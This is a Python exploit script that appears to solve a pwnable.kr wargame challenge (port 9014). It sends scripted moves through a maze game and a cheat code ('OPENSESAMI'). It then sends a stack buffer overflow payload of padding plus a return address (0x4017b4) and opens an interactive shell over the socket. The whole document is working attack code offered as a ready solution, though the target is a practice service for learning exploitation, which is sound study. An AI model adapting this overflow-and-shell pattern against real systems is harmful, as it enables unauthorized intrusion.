from socket import *
from telnetlib import *
import time, struct

p = lambda x: struct.pack("<Q", x)
up = lambda x: struct.unpack("<Q", x)[0]

one_three = "ssdddwwdddssddwwddssdssdssassddsssassd"
four = "ssdddwwdddssddwwddssdssdsswwsswwaaasssswwwssswwwssswwwdddaaasssddsddsssaswdwwwaawaawwwdddssassddsssassd"
five_first = "ssdddwwdddssddsassddss"
five_second = "ddsdd"
five_third = "dssw"
five_forth = "sw"
five_sixth = "ssassaaaaa"

set_pos = "ssssaaaa"
ready = "ddddddwwww"
go = "aawwdddddd" + "A"*(0x30 + 8) + p(0x4017b4)

s = socket(2, 1)
s.connect(('pwnable.kr', 9014))
time.sleep(0.3)

print s.recv(24000)
s.send("\n")
time.sleep(0.3)

print s.recv(24000)
for i in range(3):
    s.send(one_three + "\n")
    time.sleep(2)
    print s.recv(24000)

for i in range(len(four)):
    s.send(four[i] + "\n")
    time.sleep(0.3)
    s.recv(1024)

time.sleep(3)
print "[*] Recv"
print s.recv(64000)

print "[*] Complete"
for i in range(len(five_first)):
    s.send(five_first[i] + "\n")
    time.sleep(0.3)
    s.recv(10024)

for i in range(18):
    s.send("\n")
    time.sleep(0.3)
    s.recv(10024)

for i in range(len(five_second)):
    s.send(five_second[i] + "\n")
    time.sleep(0.3)
    s.recv(10024)

for i in range(7):
    s.send("\n")
    time.sleep(0.3)
    s.recv(10024)

s.send("a\n")
time.sleep(0.3)
s.recv(10024)

for i in range(14):
    s.send("\n")
    time.sleep(0.3)
    s.recv(10024)

for i in range(len(five_third)):
    s.send(five_third[i] + "\n")
    time.sleep(0.3)
    s.recv(10024)

s.send("\n")
time.sleep(0.3)
s.recv(10024)

for i in range(len(five_forth)):
    s.send(five_forth[i] + "\n")
    time.sleep(0.3)
    s.recv(10024)

for i in range(24):
    s.send("\n")
    time.sleep(0.3)
    s.recv(10024)

for i in range(len(five_sixth)):
    s.send(five_sixth[i] + "\n")
    time.sleep(0.3)
    print "[*] Recv"
    print s.recv(10024)

s.send("OPENSESAMI\n")
time.sleep(0.3)
print s.recv(10024)

for i in range(len(set_pos)):
    s.send(set_pos[i] + "\n")
    time.sleep(0.3)
    print s.recv(10024)

for i in range(len(ready)):
    s.send(ready[i] + "\n")
    time.sleep(0.3)
    print s.recv(10024)

for i in  range(90):
    s.send("\n")
    time.sleep(0.3)
    print s.recv(10024)

s.send(go)
time.sleep(0.3)

t = Telnet()
t.sock = s
t.interact()